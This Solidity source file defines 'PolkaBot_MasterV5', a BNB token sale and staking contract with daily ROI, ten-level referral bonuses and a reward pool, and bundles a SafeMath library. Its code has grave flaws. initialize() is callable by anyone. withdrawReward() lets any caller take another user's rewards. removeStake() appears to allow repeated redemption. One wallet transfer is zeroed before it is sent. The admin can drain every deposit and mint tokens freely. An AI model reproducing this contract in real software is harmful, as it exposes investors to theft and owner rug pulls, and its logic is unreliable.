// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


import "./SafeMath.sol";


//****************************************************************************//
//---------------------        MAIN CODE STARTS HERE     ---------------------//
//****************************************************************************//
    

interface IBEP20Token
{
    function mintTokens(address receipient, uint256 tokenAmount) external returns(bool);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function balanceOf(address user) external view returns(uint256);
    function totalSupply() external view returns (uint256);
    function maxsupply() external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
    function burn_internal(uint256 _value, address _to) external returns (bool);
}

contract PolkaBot_MasterV5 {
    
    IBEP20Token public rewardToken;
    /*===============================
    =         DATA STORAGE          =
    ===============================*/

    // Public variables of the token
    using SafeMath for uint256;


    struct Stake {
        uint256 amount;
        uint256 startTime;  
        uint256 endTime;
        uint dailyreward;
    }

    struct User {
		Stake[] stake;
		address referrer;
        uint256 referrerBonus;
        uint256 Total_Token_buy;
        uint256 Total_buy;
        uint256 totalReferrer;
        uint256[10] refStageIncome; //total business of referrer each stage
        uint256[10] refStageBonus; //bonus of referrer each stage
		uint[10] refs;  // number of referrer each stage
        uint256 lastPoolAmount;
        uint256 lastpercent;
	}

    struct PoolLog{
        uint256 poolAmount;
        uint256 percent;
        uint256 rewardAmount;
    }

    

    
      mapping (address => User) public users;
      mapping(address=>PoolLog[]) public poollog;
      uint256  private _decimals;
      uint256 public tokenPriceInitial_;
      uint256 public tokenPriceIncremental_;
      uint[10] public ref_bonuses;
      uint[10] public requiredDirect;
      uint[4] public requiredownbuy;

      
     
      uint256 internal stakingRequirement;
      uint256 public _currentPurchseLimit;

      uint256 internal TradingWallet;

      address[] internal stakeholders;
      
      uint256  public TIME_STEP;
      address payable admin;

      uint256 public adminFee;

      uint256 public contractPlaced;

      bool public isMaxPayout;
      bool public IsInitinalized;
      uint256 public roiPercentage;
      uint256 public systemPoolAmount;
      uint public systemPoolPercent;
      uint public poolPercentDivider;
       
       
       /*===============================
        =         PUBLIC EVENTS         =
        ===============================*/

     // This generates a public event of token transfer
     event BuyToken(address indexed user, uint256 AmountofToken);
     event SellToken(address indexed user, uint256 Amountofvalue);
     event StakeToken(address indexed user, uint256 Token);
     event CompoundStakeToken(address indexed user, uint256 Token);
     event Withdrawn(address indexed user, uint256 Amount);
     event UnStake(address indexed user, uint256 Token);
     



   function initialize(IBEP20Token _rewardToken, address payable _admin) public{
     require (IsInitinalized == false,"Already Started");
        rewardToken = _rewardToken;
        _currentPurchseLimit = 0;
        admin=_admin;
        contractPlaced = block.timestamp;
        _decimals = 8;
        tokenPriceInitial_ = 2300000000000;
        tokenPriceIncremental_ = 23000;
        ref_bonuses = [5,5,5,5,5,3,3,3,3,3];
        requiredDirect = [1,2,3,4,5,6,7,8,9,10];
        requiredownbuy = [100000,500000,2000000,5000000];
        stakingRequirement = 10000000000;
        TIME_STEP =  1 days;
        adminFee = 5;
        systemPoolPercent = 2000;
        poolPercentDivider = 10000;
        roiPercentage = 10;
        IsInitinalized = true;
   }


    function percent(uint numerator, uint denominator, uint precision) internal pure returns(uint quotient) {

            // caution, check safe-to-multiply here
            uint _numerator  = numerator * 10 ** (precision+1);
            // with rounding of last digit
            uint _quotient =  ((_numerator / denominator) + 5) / 10;
            return ( _quotient);
    }

   /**
    * @notice A method to check if an address is a stakeholder.
    * @param _address The address to verify.
    * @return bool, uint256 Whether the address is a stakeholder,
    * and if so its position in the stakeholders array.
    */
   function isStakeholder(address _address) public view returns(bool, uint256)
   {
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           if (_address == stakeholders[s]) return (true, s);
       }
       return (false, 0);
   }

   /**
    * @notice A method to add a stakeholder.
    * @param _stakeholder The stakeholder to add.
    */
   function addStakeholder(address _stakeholder) internal{
       (bool _isStakeholder,) = isStakeholder(_stakeholder);
       if(!_isStakeholder) stakeholders.push(_stakeholder);
   }

   /**
    * @notice A method for a stakeholder to create a stake.
    * @param _stake The size of the stake to be created.
    */
   function createStake(uint256 _stake) external{
       uint _balanceOf = rewardToken.balanceOf(msg.sender);
       require( _balanceOf >= _stake, 'Insufficent Token!');
       require( _stake >= stakingRequirement, 'Min stake 100 Polkabot!');
       rewardToken.transferFrom(msg.sender,address(this),_stake);
       if(users[msg.sender].stake.length == 0) addStakeholder(msg.sender);
       users[msg.sender].lastPoolAmount = systemPoolAmount;
       users[msg.sender].stake.push(Stake(_stake, block.timestamp, 0, roiPercentage));
       emit StakeToken(msg.sender,_stake);
   }

   
   function removeStake(uint _index) external
   {
       uint256 _balanceOfstakes = users[msg.sender].stake[_index].amount.add(getUserDividend(msg.sender,_index));
       require( _balanceOfstakes > 0 , 'Insufficent Token!');
       users[msg.sender].stake[_index].endTime = block.timestamp;
       rewardToken.transferFrom(address(this),msg.sender,users[msg.sender].stake[_index].amount);
       _mintTokens(msg.sender, _balanceOfstakes.sub(users[msg.sender].stake[_index].amount));
       emit UnStake(msg.sender,_balanceOfstakes);
   }

                                //    POOL Code

    function getCurentPoolPercent() public view returns(uint per){
        if(systemPoolAmount>0){
            uint totalStake = totalStakes();
            per = (systemPoolAmount*1e10/totalStake).mul(100);
            per = per/1e8;
        }
      
    }

    function getUserPoolAmount(address _user) public view returns(uint amount, uint per){
        User storage user = users[_user];
        if(user.stake.length>0){
            per = getCurentPoolPercent();
            per = per.sub(user.lastpercent);
            uint pool = systemPoolAmount.sub(user.lastPoolAmount);
            amount = pool.mul(per).div(poolPercentDivider);
        }
        return (amount,per);
    }

    function claimPoolReward() public{
         User storage user = users[msg.sender];
        require(user.stake.length>0,"you are not member");
        (uint rewardAmount,uint per) = getUserPoolAmount(msg.sender);
        require(rewardAmount>0, "you are not eligible for reward");
        user.lastPoolAmount = systemPoolAmount;
        user.lastpercent = getCurentPoolPercent();
        poollog[msg.sender].push(PoolLog(systemPoolAmount,per,rewardAmount));
        _mintTokens(msg.sender,rewardAmount);

    }

                                        // end

   function buyToken(address _referrer) external payable {

         User storage user = users[msg.sender];

         uint256 _taxedValue = msg.value;
         uint256 _amountOfTokens = BNBToTokens_(_taxedValue);

         if (user.referrer == address(0) && _referrer != msg.sender){
             user.referrer = _referrer;
         }

         require(user.referrer != address(0) || msg.sender == admin, "No upline");
        
         if (user.referrer != address(0)) {
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)){
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msg.value);
                    users[upline].refs[i] = users[upline].refs[i].add(1);
					users[upline].totalReferrer++;
                    upline = users[upline].referrer;
                } else break;
            }
            
        }

        // referral distribution
        _refPayout(msg.sender,_amountOfTokens);
         user.Total_Token_buy = user.Total_Token_buy.add(_amountOfTokens);
         user.Total_buy = user.Total_buy.add(_taxedValue);
         TradingWallet = TradingWallet.add(_taxedValue.mul(2).div(100));
         _mintTokens(msg.sender,_amountOfTokens);
         emit BuyToken(msg.sender,_amountOfTokens);
       
   }

   function sellToken(uint256 _amountOfTokens) external {

        
        uint256 _balanceOf = rewardToken.balanceOf(msg.sender);
        require(_amountOfTokens <= _balanceOf, 'Insufficent Token!');
        uint256 _tokens = _amountOfTokens;
        uint256 _bnb = tokensToBNB_(_tokens);
        uint256 fee = _bnb.mul(adminFee).div(100);
        uint256 actualBnb = _bnb.sub(fee);
        rewardToken.burn_internal(_amountOfTokens,msg.sender);
        /// admin fee
        _safeTransfer(admin,fee);
         /// amount of bnb
        _safeTransfer(payable(msg.sender),actualBnb);
        emit SellToken(msg.sender,actualBnb);

    }

    function calculateTokensReceived(uint256 _bnbToSpend) public view returns (uint256) {
        uint256 _amountOfTokens = BNBToTokens_(_bnbToSpend);
        return _amountOfTokens;
    }

    function calculateBnbReceived(uint256 _tokensToSell) public view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        require(_tokensToSell <= tokenSupply_);
        uint256 _bnb = tokensToBNB_(_tokensToSell);
        uint256 fee = _bnb.mul(adminFee).div(100);
        return _bnb.sub(fee);
    }


   function sellPrice() public view returns (uint256) {
        // our calculation relies on the token supply, so we need supply. Doh.

       uint256 tokenSupply_ = rewardToken.totalSupply();

        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _price = tokensToBNB_(1e8);
            return _price;
        }
    }

    function buyPrice() public view returns (uint256) {

        uint256 tokenSupply_ = rewardToken.totalSupply();
        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ + tokenPriceIncremental_;
        } else {
            uint256 _price = tokensToBNB_(1e8);
            return _price;
        }
    }

    function BNBToTokens_(uint256 _bnb) internal view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e8;
        uint256 _tokensReceived = ((SafeMath.sub((sqrt((_tokenPriceInitial ** 2)
        + (2 * (tokenPriceIncremental_ * 1e8) * (_bnb * 1e8))
        + ((tokenPriceIncremental_ ** 2) * (tokenSupply_ ** 2))
        + (2 * tokenPriceIncremental_ * _tokenPriceInitial*tokenSupply_)
        )), _tokenPriceInitial)) / (tokenPriceIncremental_)) - (tokenSupply_);
        return _tokensReceived;
    }

    function tokensToBNB_(uint256 _tokens) internal view returns (uint256) {
        uint256 tokenSupply_ = rewardToken.totalSupply();
        uint256 tokens_ = (_tokens + 1e8);
        uint256 _tokenSupply = (tokenSupply_ + 1e8);
        uint256 _tronReceived = (SafeMath.sub((((tokenPriceInitial_ + (tokenPriceIncremental_ * (_tokenSupply / 1e8))
            ) - tokenPriceIncremental_) * (tokens_ - 1e8)
            ), (tokenPriceIncremental_ * ((tokens_ ** 2 - tokens_) / 1e8)) / 2)/ 1e8);
        return _tronReceived;
    }



   function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if((users[up].refs[0] >= requiredDirect[i]) || (users[up].Total_Token_buy >= requiredownbuy[i].mul(1e8))){ 

    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
                    
            }
            up = users[up].referrer;
        }
    }

  

   function compound(uint _index) external {
        User storage user = users[msg.sender];
        uint256 dividend = getUserDividend(msg.sender,_index);
        require(user.stake[_index].endTime == 0, "stake already received!"); 
        user.stake[_index].amount = user.stake[_index].amount.add(dividend);
        user.stake[_index].startTime = block.timestamp;
        emit CompoundStakeToken(msg.sender,dividend);
   }


   function getUserTotalDividends(address userAddress) public view returns (uint256) {

       User storage user = users[userAddress];
       uint256 totalDividends;
	   uint256 dividends;
       uint256 total_TokenSupply = totalTokenSupply();
       

		for (uint256 i = 0; i < user.stake.length; i++) {

            if (user.stake[i].endTime == 0) {

                uint256 maxPayout = user.stake[i].amount.mul(150).div(100);
                dividends = (user.stake[i].amount.mul(user.stake[i].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[i].startTime)).div(TIME_STEP);
                if (isMaxPayout && user.stake[i].amount.add(dividends) > maxPayout) {
                    dividends = user.stake[i].amount;
                }
            }
            totalDividends = totalDividends.add(dividends);
        }

        if(total_TokenSupply.add(totalDividends) > rewardToken.maxsupply()){
            uint256 maxSuply = rewardToken.maxsupply();
            totalDividends = maxSuply.sub(total_TokenSupply);
        }


        return totalDividends;
   }

    function getUserDividend(address userAddress, uint _index) public view returns (uint256) {

       User storage user = users[userAddress];
       uint256 total_TokenSupply = totalTokenSupply();
	   uint256 dividends;

            if (user.stake[_index].endTime == 0) {
               uint256 maxPayout = user.stake[_index].amount.mul(150).div(100);
                dividends = (user.stake[_index].amount.mul(user.stake[_index].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[_index].startTime)).div(TIME_STEP);
                if (isMaxPayout && user.stake[_index].amount.add(dividends) > maxPayout) {
                    dividends = user.stake[_index].amount;
                }
            }
           
        if(total_TokenSupply.add(dividends) > rewardToken.maxsupply()){
            uint256 maxSuply = rewardToken.maxsupply();
            dividends = maxSuply.sub(total_TokenSupply);
        }

        return dividends;
   }


   function getUserTotalStake(address userAddress) public view returns (uint256) {

        User storage user = users[userAddress];
        uint256 TotalStake;
        for (uint256 i = 0; i < user.stake.length; i++) {
            if (user.stake[i].endTime == 0) {
                TotalStake = TotalStake.add(user.stake[i].amount);
            }
        }

        return TotalStake;
   }

   function withdrawReward(address userAddress) external {
      
       User storage user = users[userAddress];
       (uint256 totalDividends) = getUserTotalDividends(userAddress);
       uint256 totalReward = totalDividends.add(user.referrerBonus);
       uint256 value = totalReward.mul(20).div(100);
       systemPoolAmount = systemPoolAmount.add(value);
       totalReward = totalReward.sub(value);
       users[userAddress].referrerBonus = 0;

       for (uint256 i = 0; i < user.stake.length; i++) {
            if (user.stake[i].endTime == 0) {
                user.stake[i].startTime = block.timestamp;
            }
        }

        _mintTokens(msg.sender,totalReward);

   }

    function getUserDetails(address _user) external view returns(uint _stakeLength, uint256 _TotalBuy, uint256 _Total_token_buy, address _referrer){
            User storage user = users[_user];
            return (user.stake.length, user.Total_buy, user.Total_Token_buy, user.referrer);
    }



    // function getCurrentRewardPer() public view returns(uint _per){

    //     uint dep = 0;
    //     if(contractPlaced +360 days > block.timestamp){
    //         dep = 5; // 0.5 percent
    //     }else if(contractPlaced +180 days > block.timestamp){
    //         dep = 10; // 1 percent
    //     }else{
    //         dep = 2; // 2 percent
    //     }

    //     return dep;
    // }

    function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
    }

   function userBalanceOf(address _addr) external view returns(uint _amount){
       _amount = rewardToken.balanceOf(_addr);  
   }

   function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }

    function _mintTokens(address receipient, uint256 tokenAmount) internal{
        rewardToken.mintTokens(receipient,tokenAmount);
    }

    function _mintTokensByOwner(address receipient, uint256 tokenAmount) external{
        require(msg.sender == admin);
        rewardToken.mintTokens(receipient,tokenAmount);
    }

   function stakeOf(address _stakeholder, uint _index) external view returns(uint amount,uint starttime , uint endtime ,uint dailyReward){
        amount = users[_stakeholder].stake[_index].amount;
        starttime =users[_stakeholder].stake[_index].startTime;
        endtime = users[_stakeholder].stake[_index].endTime;
        dailyReward = users[_stakeholder].stake[_index].dailyreward;
    
   }

   function getUserPoolLogLength(address _user) public view returns(uint length){
    length = poollog[_user].length;
   }

   function getstakeLength(address _user) public view returns(uint length){
    length = users[_user].stake.length;
   }

   /**
    * @notice A method to the aggregated stakes from all stakeholders.
    * @return uint256 The aggregated stakes from all stakeholders.
    */
   function totalStakes() public view returns(uint256){
       uint256 _totalStakes = 0;
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           _totalStakes = _totalStakes.add(getUserTotalStake(stakeholders[s]));
       }
       return _totalStakes;
   }

   function totalTokenSupply() public view returns(uint256){
       return rewardToken.totalSupply();
   }
   
   
   function stakeholdersLength() public view returns(uint256){
       return stakeholders.length;
   }

    function updateIntlPrice(uint256 _amount) external{
       require(msg.sender == admin);
       tokenPriceInitial_ = _amount;
   }

   function updateStakingRequirement(uint256 _amount) external{
       require(msg.sender == admin);
       stakingRequirement = _amount;
   }

   function updateAdminFee(uint256 _percent) external{
       require(msg.sender == admin);
       adminFee = _percent;
   }

   function updateisMaxPayout(bool _bool) external{
       require(msg.sender == admin);
       isMaxPayout = _bool;
   }

   

   function safeMode() external{
       require(msg.sender == admin);
       _safeTransfer(payable(address(msg.sender)),address(this).balance);
   }

   function TransferToTradingWallet(address payable _address) external{
       require(msg.sender == admin);
       TradingWallet = 0;
       _safeTransfer(_address,TradingWallet);
   }

   function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

   

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}